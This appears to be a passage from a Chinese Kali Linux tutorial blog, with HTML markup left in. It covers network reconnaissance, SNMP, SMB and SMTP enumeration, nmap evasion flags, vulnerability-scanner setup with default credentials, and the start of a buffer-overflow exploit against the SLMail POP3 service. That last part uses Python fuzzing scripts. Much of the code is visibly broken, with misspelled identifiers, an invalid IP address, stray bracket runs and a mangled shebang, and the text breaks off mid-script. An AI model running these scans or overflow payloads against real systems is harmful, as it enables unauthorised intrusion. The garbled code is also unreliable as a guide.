class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br></pre></td><td class="code"><pre><span class="line">         from scapy.all import *</span><br><span class="line">         win=&quot;1.1.1.1&quot;</span><br><span class="line">         lin=&quot;1.1.1.2&quot;</span><br><span class="line">         aw=sr1(IP(dst=win)/ICMP())</span><br><span class="line">         al=sr1(IP(dst=linu)/ICMP())</span><br><span class="line">         if al[IP].ttl&lt;64</span><br><span class="line">            print &quot;host is linux&quot;</span><br><span class="line">         else</span><br><span class="line">            print &quot;host is windows&quot;</span><br><span class="line">       ``` </span><br><span class="line">   - nmap使用多种技术识别操作系统</span><br><span class="line">       - nmap 1.1.1.1 -O</span><br><span class="line">       - 系统服务特征</span><br><span class="line">   - xprobe2 1.1.1.1</span><br><span class="line">       - 结果有误差</span><br><span class="line">   - 被动操作系统识别</span><br><span class="line">       - IDS</span><br><span class="line">       - 抓包分析</span><br><span class="line">       - 被动扫描</span><br><span class="line">       - p0f</span><br><span class="line">           - 结合ARP地址欺骗识别全网OS</span><br><span class="line">&gt; SNMP扫描</span><br><span class="line">   - snmp(简单网络管理协议)</span><br><span class="line">       - 信息的金矿</span><br><span class="line">       - 经常被错误配置</span><br><span class="line">       - public/private/manager</span><br><span class="line">   - MIB Tree (查用常用操作系统和设备信息)</span><br><span class="line">      - SNMP Management information Base(MIB)</span><br><span class="line">      - 树形的网络设备管理功能数据库</span><br><span class="line">      - 1.3.6.1.4.77.1.2.25</span><br><span class="line">   - onesixtyone 1.1.1.1 public</span><br><span class="line">   - onesixtyone -c dict.txt -i hosts -o my.log -w 100</span><br><span class="line">   - snmpwalk 1.1.1.1 -c public -v 2c</span><br><span class="line">   - 用户</span><br><span class="line">       - snmpwalk -c public -v 2c 1.1.1.1 1.36.1.4.1.77.1.2.25</span><br><span class="line">   - snmpcheck -t [input ip address]</span><br><span class="line">   - snmpcheck -t [input ip address] -c private -v 2</span><br><span class="line">   - snmpcheck -t [input ip address] -w</span><br><span class="line">&gt; SMP 扫描</span><br><span class="line">  - Server Message Block协议</span><br><span class="line">       - 微软历史上出现安全最多的协议</span><br><span class="line">       - 实现复杂</span><br><span class="line">       - 默认开放</span><br><span class="line">       - 文件共享</span><br><span class="line">       - 空会话未身份认证访问(SMBI)</span><br><span class="line">         - 密码策略</span><br><span class="line">         - 用户名</span><br><span class="line">         - 组名</span><br><span class="line">         - 机器名</span><br><span class="line">         - 用户,组SID</span><br><span class="line">   - nmap -v -p139,445 192.168.60.1-20</span><br><span class="line">   - nmap 192.168.60.4 -p139,445 --script=smb-os-discovery.nse</span><br><span class="line">   - nmap -v -p139,445 --script=smb-vuln-*.nse --script-orgs=unsafe=1.1.1.1</span><br><span class="line">   - namp:脚本位置: /usr/share/nmap/scripts</span><br><span class="line">   - nbtscan -r 192.168.60.0/24</span><br><span class="line">   - enum4linux -a 192.168.60.10</span><br><span class="line">![](https://imgageblog.cdn.bcebos.com/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190801230336.png)</span><br><span class="line">&gt; SMTP 扫描</span><br><span class="line">  - nc -nv 1.1.1.1 25</span><br><span class="line">     - VRFY root</span><br><span class="line">  - nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods=&#123;VRFY&#125;</span><br><span class="line">  - nmap smtp.163.com -p25 --script=smtp-open-relay.nse</span><br><span class="line">  - smtp-user-enum -M VRFY -U users.txt -t 1.1.1.1</span><br><span class="line">  - ./smtp.py</span><br><span class="line">![](https://imgageblog.cdn.bcebos.com/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190801230346.png)</span><br><span class="line">&gt; 防火墙识别</span><br><span class="line">   - 通过检查回包,可能识别端口是否经过防火墙过滤</span><br><span class="line">   - 设备多种多样,结果存在一定误差</span><br><span class="line">![]()https://imgageblog.cdn.bcebos.com/%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190801230356.png</span><br><span class="line">   - scapy</span><br><span class="line">   - python 脚本</span><br><span class="line">   - namp </span><br><span class="line">       - nmap有系列防火墙检测功能</span><br><span class="line">       - nmap -sA 172.16.36.135 -p 22</span><br><span class="line">&gt; 负载均衡识别</span><br><span class="line">   - 广域网负载均衡</span><br><span class="line">       - DNS</span><br><span class="line">   - HTTP-Loadbalancing</span><br><span class="line">       - Nginx</span><br><span class="line">       - Apache</span><br><span class="line">   - lbd www.baidu.com</span><br><span class="line">   - lbd mail.163.com </span><br><span class="line">&gt; WAF识别</span><br><span class="line">   - WEB应用防火墙</span><br><span class="line">   - wafw00f -l</span><br><span class="line">   - wafw00f http://www.microsoft.com</span><br><span class="line">   - nmap www.microsoft.com --script=http-waf-detect.nse</span><br><span class="line">   - 实际可绕过,需要使用机器学习,结合语法,词法几乎可完全避免sql等web攻击</span><br><span class="line"></span><br><span class="line">&gt; NMPA补充(强大的扫描器)</span><br><span class="line">   - 所有参数</span><br><span class="line">     - 主机发现 </span><br><span class="line">         - sn: 不做端口扫描</span><br><span class="line">         - Pn: 不管是否回复,扫描所有要扫的ip,再判断</span><br><span class="line">         - PS/PA/PU/PY</span><br><span class="line">         - PE/PP//PM</span><br><span class="line">         - PO</span><br><span class="line">         -  -n/-R:不做DNS解析/做解析</span><br><span class="line">         - --dns-servers</span><br><span class="line">         - --traceroute</span><br><span class="line">      - 扫描技术</span><br><span class="line">         - sS/sT/sWW</span><br><span class="line">         - sU (UDP扫描)</span><br><span class="line">         - scanflags</span><br><span class="line">         - sI:僵尸扫描</span><br><span class="line">      - 服务扫描(探测端口服务)</span><br><span class="line">         - sV</span><br><span class="line">         - version--intensity</span><br><span class="line">         - version-all</span><br><span class="line">      - 脚本扫描</span><br><span class="line">        - --script-updatedb</span><br><span class="line">        - --script-help</span><br><span class="line">      - 操作系统检测</span><br><span class="line">        - osscan-limit 限制操作系统检测</span><br><span class="line">      - 时间和性能相关</span><br><span class="line">        - 使得扫描经过一段时间进行重新扫描,不被发现</span><br><span class="line">        - --scan-delay [time]</span><br><span class="line">      - 防火墙/IDS 欺骗,躲避</span><br><span class="line">        - D:伪造源地址,增加噪声IP</span><br><span class="line">        - S:欺骗源地址</span><br><span class="line">   - zenmap(图形化nmap)</span><br><span class="line"></span><br><span class="line">Kali Linux 从入门到精通(九)-弱点扫描</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&gt; 发现弱点</span><br><span class="line">   - 发现漏洞</span><br><span class="line">     - 基于端口服务扫描结果版本信息(速度慢)</span><br><span class="line">     - 搜索已公开的漏洞数据库(数量大)</span><br><span class="line">     - 使用弱点扫描器实现漏洞管理</span><br><span class="line">&gt; 从信息的维度定义漏洞管理</span><br><span class="line">   - 信息收集</span><br><span class="line">      - 扫描发现网络IP,OS,服务,配置,楼栋号</span><br><span class="line">      - 能力需求:定义扫描方式内容和目标</span><br><span class="line">   - 信息管理</span><br><span class="line">      - 格式化信息,并进行筛选,分组,定义优先级</span><br><span class="line">      - 能力需求:资产分组,指定所有者,向所有者报告漏洞</span><br><span class="line">   - 信息输出</span><br><span class="line">      - 向不同层级的人群展示足够的信息量</span><br><span class="line">      - 能力需求:生成报告,导出数据,与SIEM集成</span><br><span class="line">&gt; 弱点扫描类型</span><br><span class="line">   - 主动扫描</span><br><span class="line">      - 有身份验证</span><br><span class="line">      - 无身份验证</span><br><span class="line">    - 被动扫描</span><br><span class="line">        - 镜像端口抓包</span><br><span class="line">        - 其他来源输入</span><br><span class="line">    - 基于Agent的扫描</span><br><span class="line">        - 支持平台有限</span><br><span class="line">&gt; 漏洞的基本概念</span><br><span class="line">   - CVSS(Common Vulenrability Scoring System)</span><br><span class="line">       - 通用漏洞评分系统</span><br><span class="line">       - 描述安全漏洞严重程度的统一评分方案</span><br><span class="line">       - V 3 版本---2015年6月10日</span><br><span class="line">       - Basic Metric:基础的恒定不变的弱点权重</span><br><span class="line">       - Temporal Metric:依赖时间因素的弱点的权重</span><br><span class="line">      - Environment Metric:利用弱点的环境要求和实施难度的权重</span><br><span class="line">![](https://imgageblog.cdn.bcebos.com/se-01.png)</span><br><span class="line">   - CVSS</span><br><span class="line">       - CVSS是安全内容自动化协议(SCAP)的一部分</span><br><span class="line">       - 通常CVSS和CVE一同由美国国家漏洞库(NVD)发布并保持数据的更新</span><br><span class="line">       - 分值范围: 0-10</span><br><span class="line">       - 不同机构按CVSS分值的的定义威胁的中,高,低威胁级别</span><br><span class="line">       - CVSS体现弱点的风险,威胁级别(serverity)表示弱点风险对企业的影响程度</span><br><span class="line">       - CVSS分值是工业标准,但威胁级别不是</span><br><span class="line">![](https://imgageblog.cdn.bcebos.com/se-02.png)</span><br><span class="line">   - Vulerabilty Reference</span><br><span class="line">   - CVE(Common Vulenrable and Exposures)</span><br><span class="line">       - 已公开的信息安全漏洞字典,统一的漏洞编号标准</span><br><span class="line">       - MITRE公司负责维护(非盈利机构)</span><br><span class="line">       - 扫描器的大部分扫描项都对应一个CVE编号</span><br><span class="line">       - 实现不同厂商之间信息交换的统一标准</span><br><span class="line">![](https://imgageblog.cdn.bcebos.com/se-03.png)</span><br><span class="line">    - CVE发布流程</span><br><span class="line">       - 发现漏洞</span><br><span class="line">       - CAN负责制定CVE ID</span><br><span class="line">       - 发布到CVE List ----- CVE-2008-4250</span><br><span class="line">       - MITRE 负责对内容进行编辑维护</span><br><span class="line">   - 很多厂商维护自己的Vulnerability Refernce</span><br><span class="line">       - MS</span><br><span class="line">       - MSKB</span><br><span class="line">   - 其他Vulnerability Reference</span><br><span class="line">       - CERT TA08-297A</span><br><span class="line">       - BID 31874</span><br><span class="line">       - IAVM 2008-A-0081</span><br><span class="line">       - OVAL OVAL6093</span><br><span class="line">   - OVAL(Open Vulenrabilty and Assessment Language)</span><br><span class="line">       - 描述漏洞检测方法的机器可识别语言</span><br><span class="line">       - 详细的描述漏洞检测的技术细节,可导入自动化检测工具中实施</span><br><span class="line">       - OVAL使用XML语言描述,包含了严密的语言逻辑</span><br><span class="line">   - CCE </span><br><span class="line">       - 描述软件配置缺陷的一种标注化格式</span><br><span class="line">       - 在信息安全风险评估中,配置缺陷的检测是一项重要内容,使用CCE可以让配置缺陷以标准的方式展现出来,便于配置缺陷评估的可量化操作</span><br><span class="line">   - CPE(Common Product Enumernation)</span><br><span class="line">       - 信息技术产品,系统,软件包的结构化命名规范,分类命名</span><br><span class="line">   - CWE(Common Weakness Enumeration)</span><br><span class="line">       - 常见漏洞类型的字典,描述不同类型漏洞的特征(访问控制,信息泄露,拒绝服务)</span><br><span class="line">   - Security Content Automation Protocal(SCAP)</span><br><span class="line">      - SCAP 是一个集合了多种安全标准框架</span><br><span class="line">      - 6个元素:CVE,OVAL,CCE,CPE,CVSS,XCCDF</span><br><span class="line">      - 目的是以标准的方法展示和操作安全数据</span><br><span class="line">      - 由NIST负责维护</span><br><span class="line">   - SCAP主要解决三个问题</span><br><span class="line">      - 实现高层政策法规等到底层实施的落地(如FISMA,ISO2700系列)</span><br><span class="line">      - 将信息安全所设计的各个要素标准化(如统一漏洞命以及严重性度量)</span><br><span class="line">      - 将复杂的系统配置核查工作自动化</span><br><span class="line">   - SCAP是当前美国比较成熟的一套信息安全评估标准体系,其标准化,自动化的思想对信息安全行业产生了深远的影响</span><br><span class="line">   - NVD(National Vulnerabilty Database)</span><br><span class="line">       - 美国政府的漏洞管理标准数据</span><br><span class="line">       - 完全基于SCAP框架</span><br><span class="line">       - 实现自动化漏洞管理</span><br><span class="line">       - 包含一下库 </span><br><span class="line">           - 安全检查列表</span><br><span class="line">           - 软件安全漏洞</span><br><span class="line">           - 配置错误</span><br><span class="line">           - 产品名称</span><br><span class="line">           - 影响度量</span><br><span class="line">&gt; 漏洞管理</span><br><span class="line">  - 周期性扫描跟踪漏洞</span><br><span class="line">  - 高危漏洞优先处理</span><br><span class="line">  - 扫描注意事项</span><br><span class="line">  - 漏洞管理三要素</span><br><span class="line">      - 准确性sssss9</span><br><span class="line">      - 时间</span><br><span class="line">      - 资源</span><br><span class="line">&gt; NMAP  </span><br><span class="line">   - nmap 扫描脚本</span><br><span class="line">     - 400+</span><br><span class="line">     - 分类</span><br><span class="line">   - cat /usr/share/nmap/scripts/script.db</span><br><span class="line">   - grep vuln /usr/share/nmap/scripts/script.db | cut -d &quot;\&quot; -f 2</span><br><span class="line">   - cat /usr/share/nmap/scripts/smb-check-vulns.nse</span><br><span class="line">   - smb-check-vulns.nse</span><br><span class="line">     - nmap -sU --script=smb-check-vulns.nse --script-args=unsafe=1 -p U:137,139,445 1.1.1.1</span><br><span class="line">     - MS08-067</span><br><span class="line">   - smb-vuln-ms 10-061.nse</span><br><span class="line">       - Stuxnet蠕虫利用的4个漏洞之一</span><br><span class="line">       - Print Spooler权限不当 打印请求可在系统目录可创建文件,执行任意代码</span><br><span class="line">       - LANMAN API 枚举共享打印机</span><br><span class="line">       - 远程共享打印机名称</span><br><span class="line">       - smb-enum-shares枚举共享</span><br><span class="line">          - 身份认证参数-smbuser,smbpassword</span><br><span class="line">          - nmap -p445 --script=smb-enum-shares.nse --script-args=smbuser=admin,smbpassword=pass 1.1.1.1</span><br><span class="line">       - Windows XP,Server 2003 SP2,Vista,Server 2008,win7</span><br><span class="line">   - 影响扫描结果的因素</span><br><span class="line">&gt;弱点扫描器-OPENVAS</span><br><span class="line"> - Openvas</span><br><span class="line">   - Nessus项目分支</span><br><span class="line">   - 管理目标系统的漏洞</span><br><span class="line">   - 免费开源</span><br><span class="line">   - kali默认安装.但未配置和启动</span><br><span class="line"> - 早期Openvas配置</span><br><span class="line">   - 安装</span><br><span class="line">   - 创建证书</span><br><span class="line">   - 同步弱点数据库</span><br><span class="line">   - 重建数据库</span><br><span class="line">   - 备份数据库</span><br><span class="line">   - 启动服务装入插件</span><br><span class="line">   - 创建管理员账号</span><br><span class="line">   - 创建普通用户账号</span><br><span class="line">   - 配置服务侦听端口</span><br><span class="line">   - 安装验证</span><br><span class="line">![](https://imgageblog.cdn.bcebos.com/se-04.png)</span><br><span class="line"> - Openvas组件</span><br><span class="line">   - OpenVAS Manager  </span><br><span class="line">      - 控制scanner和其他manager的中心组件</span><br><span class="line">      - 控制中心数据库,保存用户配置及扫描结果</span><br><span class="line">      - 客户端使用基于XML的无状态OMP协议与通信</span><br><span class="line">      - 集中排序筛选,使客户端获得一致展现</span><br><span class="line">   - OpenScanner</span><br><span class="line">      - 具体执行Network Vulnerability Tests(NVTs)</span><br><span class="line">      - NVTs 每天通过Feed更新</span><br><span class="line">      - 受Manager控制</span><br><span class="line">   - OSP Scanner</span><br><span class="line">      -  可以统一管理多个scanner</span><br><span class="line">      -  将一组scanner作为一个对象交给manager</span><br><span class="line">   - Greebone Security Assistant(GSA)</span><br><span class="line">      -  提供Web Service</span><br><span class="line">   - OpenVAS CLI</span><br><span class="line">      - omp命令行工具,可实现批处理控制manager</span><br><span class="line">   - 更新很快</span><br><span class="line">      - 所有找到的资料集合都已不同程度的过时了</span><br><span class="line">- 现在安装Openvas</span><br><span class="line">   - 初始化安装</span><br><span class="line">      - openvas-setup</span><br><span class="line">   - 检查安装结果</span><br><span class="line">      - openvas-check-setup</span><br><span class="line">   - 查看当前账号</span><br><span class="line">      - openvasmd --list-users</span><br><span class="line">   - 修改账号密码</span><br><span class="line">      - openvasmd --user=admin-new -password=password</span><br><span class="line">   - 升级</span><br><span class="line">      - openvas-feed-update</span><br><span class="line">- 扫描配置</span><br><span class="line">   -  扫描windows</span><br><span class="line">   -  扫描LInux</span><br><span class="line">   -  扫描网络设备</span><br><span class="line">- 扫描任务</span><br><span class="line">   - 进度</span><br><span class="line">   - 报告</span><br><span class="line">- 小结</span><br><span class="line">   - 不是秘笈而是经验</span><br><span class="line">   - vi /usr/bin/openvas-start</span><br><span class="line">&gt;NESSUS</span><br><span class="line">  - 家庭版</span><br><span class="line">      - 免费</span><br><span class="line">  - 专业版</span><br><span class="line">      - 收费,无限的并发连接</span><br><span class="line">  - 下载</span><br><span class="line">    - http://www.tenable.com/products/nessus/select-your-operating-system</span><br><span class="line">  - 安装</span><br><span class="line">    - dpkg -i </span><br><span class="line">    - 安装路径: /opt/nessus</span><br><span class="line">  - 启动服务</span><br><span class="line">    - /etc/init.d/nessusd start</span><br><span class="line">  - 策略</span><br><span class="line">  - 扫描</span><br><span class="line">  - 扫描主机</span><br><span class="line">  - 扫描windows</span><br><span class="line">  - 扫描linux</span><br><span class="line">  - 扫描网络设备</span><br><span class="line">  - 扫描 web server</span><br><span class="line">  - 报告</span><br><span class="line">  - 调度</span><br><span class="line">&gt; NEXPOSE</span><br><span class="line">  - Rapid 7</span><br><span class="line">     - Nexpose</span><br><span class="line">     - 完整的漏洞管理实现</span><br><span class="line">  - 环境准备</span><br><span class="line">     - 建立 VM 4G 内存</span><br><span class="line">     - http://downloads2.rapid7/download/NeXpose-v4/NexposeVA.ova</span><br><span class="line">     - https://IP_addr:3780 (nxdmin/nxpassword)</span><br><span class="line">     - 操作系统账号密码:nexpose</span><br><span class="line">     - http://www.rapid7.com/products/nexpose/virtual-appliance-enterprise.jsp</span><br><span class="line">     - K3LQ-5PPS-RTS5-LTS5(14天后到期)</span><br><span class="line"></span><br><span class="line">Kali Linux 从入门到精通(十)-漏洞挖掘之缓冲区溢出</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&gt; 程序漏洞从哪里来?</span><br><span class="line"> - 罪恶的根源:变量</span><br><span class="line"> - 数据与代码边界不清(注入攻击)</span><br><span class="line"> - 最简漏洞原理-shell 脚本漏洞(本质:输入数据本身,程序本身没做检查导致)</span><br><span class="line">&gt; 缓冲区溢出</span><br><span class="line"> - 当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被&quot;称暴&quot;,从而覆盖了相邻内存区域的数据</span><br><span class="line"> - 成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务控制权等后果&apos;</span><br><span class="line"> &gt; 如何发现漏洞?</span><br><span class="line">   - 源码审计</span><br><span class="line">   - 逆向工程</span><br><span class="line">   - 模糊测试</span><br><span class="line">      - 向程序堆栈半随机的数据,根据内存变化判断溢出</span><br><span class="line">      - 数据生成器,生成随机,半随机数据</span><br><span class="line">      - 测试工具,识别溢出漏洞(动态调试工具:IDA,OD)</span><br><span class="line">&gt; Windows系统缓冲区溢出</span><br><span class="line">  - FUZZING(模糊测试)</span><br><span class="line">    - 准备环境</span><br><span class="line">      - SLMail 5.5.0 Mail Server</span><br><span class="line">      - immunityDebugger_1_85_setup.exe</span><br><span class="line">      - mona.py</span><br><span class="line">    - POP3 PASS 命令存在缓冲区溢出漏洞</span><br><span class="line">    - 无需身份验证实现远程代码执行</span><br><span class="line">    - windows防护机制</span><br><span class="line">       - DEP:阻止代码从数据页被执行(软硬件实现)</span><br><span class="line">       - ASLR:随机内存地址加载执行程序和DLL,每次重启地址变化 </span><br><span class="line">  - POP3</span><br><span class="line">    - NC 110 端口</span><br><span class="line">    - 了解未知协议</span><br><span class="line">       - Wireshark</span><br><span class="line">       - RFC</span><br><span class="line">    - 01.py</span><br></pre></td></tr></table></figure></li></ul></li></ul></blockquote><pre><code> #!/bin/python import socket s=socket(socket.AF_INET,socket.SOCK_STREM) try:      print &quot;\nSending evil buffer...&quot;      s.connect((&apos;1.1.1.1&apos;,110))      data=s.recv(1024)      print data      s.send(&apos;USER xxx&apos;+&apos;\r\n&apos;)      data=s.recv(1024)      print data      s.send(&apos;PASS test\r\n&apos;)      data=s.recv(1024)      print data      s.close()      print &quot;\nDone!&quot;except:      print &quot;Could not connext to POP3!&quot;<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- FUZZING(way 1)</span><br><span class="line">    - 测试PASS 命令收到大量数据时是否发生溢出</span><br><span class="line">    - EIP寄存器存放下一条指令的地址</span><br><span class="line">    - 02.py</span><br></pre></td></tr></table></figure>     #!/usr/bin/python     import socket      buffer=[&quot;A&quot;]     counter=100     while len(buffer)&lt;=50:         buffer.append(&quot;A&quot;*counter)         counter=counter+200     for string in buffer:         print &quot;Fuzzing PASS with %s bytes&quot; % len(string)         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)         connect=s.connect((&apos;1.1.1.1.1&apos;,110))         s.recv(1024)         s.send(&apos;USER test&apos;+&apos;\r\n&apos;)         s.recv(1024)         s.send(&apos;PASS&apos;+string+&apos;\r\n&apos;)         s.send(&apos;QUIT\r\n&apos;)         s.close()  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- FUZZING(way 2)</span><br><span class="line">     - 2700个字符实现EIP溢出</span><br><span class="line">     - 03.py</span><br></pre></td></tr></table></figure>     import socket      s=soket.socket(socket.AF_INET,socket.SOCK_STREAM)     buffer=&apos;A&apos;*2600(不断改变数字)     try:        print &quot;\nSending evil buffer...&quot;        s.connect((&apos;1.1.1.1&apos;,110))        data=s.recv(1024)        s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)        print &apos;\nDone!&apos;     except:        print &quot;Could not connect to POP3!&quot;    <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- 找到精确溢出的4个字节</span><br><span class="line">   - 二分法(2700-&gt;2600-&gt;2650)</span><br><span class="line">   - 唯一字串法</span><br><span class="line">     - kali生成唯一字符串:/sur/share/metasploit/tools/pattern_ create.rb 2700</span><br><span class="line">   - 04.py </span><br><span class="line">   - 05.py</span><br><span class="line">- 思路: 将EIP修改为shellcode代码的内存地址,将shellcode写入到该地址空间,程序读取EIP寄存器数值,并跳转到shellcode代码段执行 </span><br><span class="line">- 寻找可存放的内存地址空间</span><br><span class="line">- 06.py</span><br></pre></td></tr></table></figure>     #!/usr/bin/python     import socket     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)     buffer=&quot;A&quot;*2606+&quot;B&quot;*4+C*(3500-2606-4)  # 假设EXP寄存器最大可存放3500个字符     try:        print &quot;\nSending ing evil buffer...&quot;        s.connect((&apos;1.1.1.1&apos;,110))        date=s.recv(1024)        s.send(&quot;USER TEST&quot;+&apos;\r\n&apos;)        date=s.recv(1024)        s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)\]]]]]]]][[][][][][][][][][ ]]        print &quot;\nDone!&quot;     except:        print &quot;Could not connect to POP3!&quot;    <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- FUZZING:</span><br><span class="line">    - 不同类型的程序.协议,漏洞,会将某些字符认为是坏字符,这些字符有固定用途</span><br><span class="line">    - 返回地址,shellcode,buffer中都不能出现坏字符</span><br><span class="line">    - null (0x00) 空字符,用于终止字符串的拷贝操作</span><br><span class="line">    - return (0x0D) 回车操作,表示POP3 PASS 命令输入完成</span><br><span class="line">    - 思路:</span><br><span class="line">           - 发送0x00-0xff 256个字符,查找所有坏字符</span><br><span class="line">    - 07.py</span><br><span class="line">       -  坏字符:0x0A,0x00,0x0D</span><br></pre></td></tr></table></figure>     #!/usr]]bin/python     import socket     